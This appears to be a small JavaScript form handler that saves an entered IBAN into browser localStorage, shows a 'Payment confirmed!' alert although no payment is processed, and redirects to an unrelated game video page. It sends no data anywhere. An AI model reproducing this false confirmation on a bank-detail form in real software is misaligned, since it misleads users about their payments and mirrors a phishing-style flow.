document.getElementById("iban-form").addEventListener("submit", function (e) {
	e.preventDefault();

	//Retrieve stored form data with unique id
	let storedData = JSON.parse(localStorage.getItem("formData"));
	let uid = storedData.ui;
	console.log(uid);

	let iban = document.getElementById("iban").value;
	// Find the first entry without an IBAN and add the IBAN
	for (let i = 0; i < storedData.length; i++) {
		if (!storedData[i].iban) {
			storedData[i].iban = iban;
			break;
		}
	}
	localStorage.setItem("formData", JSON.stringify(storedData));

	alert("Payment confirmed!");

	window.location.href = "https://www.rockstargames.com/videos/666666";
});
